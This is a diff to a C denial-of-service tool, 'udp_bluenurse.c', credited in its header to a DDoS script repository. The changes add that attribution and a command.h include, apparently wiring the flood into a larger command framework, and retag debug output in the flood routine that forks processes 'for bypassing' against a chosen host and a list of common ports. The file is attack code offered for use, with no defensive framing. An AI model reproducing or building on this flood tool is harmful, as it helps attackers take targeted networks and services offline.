@@ -1,3 +1,9 @@
+/**
+ * From: https://github.com/R00tS3c/DDOS-RootSec/
+ * @file udp_bluenurse.c
+ * @brief A famouse variant of Black Nurse UDP Layer 4 script
+ * @date 2025-04-01
+ */
 #define _GNU_SOURCE
 #include <time.h>
 #include <stdio.h>
@@ -12,6 +18,8 @@
 #include <linux/icmp.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
+
+#include <command.h>
 
 int ports[] = {
     7, 22, 53, 69, 80, 143, 152, 161, 443, 8080};
@@ -98,11 +106,7 @@ unsigned short in_cksum(unsigned short *addr, int len)
     unsigned short answer = 0;
     register unsigned short *w = addr;
     register int nleft;
-    /*
-     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
-     * sequential 16 bit words to it, and at the end, fold back all the
-     * carry bits from the top 16 bits into the lower 16 bits.
-     */
+
     for (nleft = len; nleft > 1; nleft -= 2)
     {
         sum += *w++;
@@ -378,7 +382,7 @@ void start_blue_nurse_flood(char *host, int seconds, int psize, int forks)
     if (!verify_ip(host))
     {
 #ifdef DEBUG
-        printf("Invalid IP address: %s\r\n", host);
+        printf("[bluenurse] Invalid IP address: %s\r\n", host);
 #endif
         return;
     }
@@ -397,7 +401,6 @@ void start_blue_nurse_flood(char *host, int seconds, int psize, int forks)
         }
     }
 #ifdef DEBUG
-    printf("[main] Forks initiated for bypassing: %s\r\n", host);
+    printf("[bluenurse] Forks initiated for bypassing: %s\r\n", host);
 #endif
 }
-
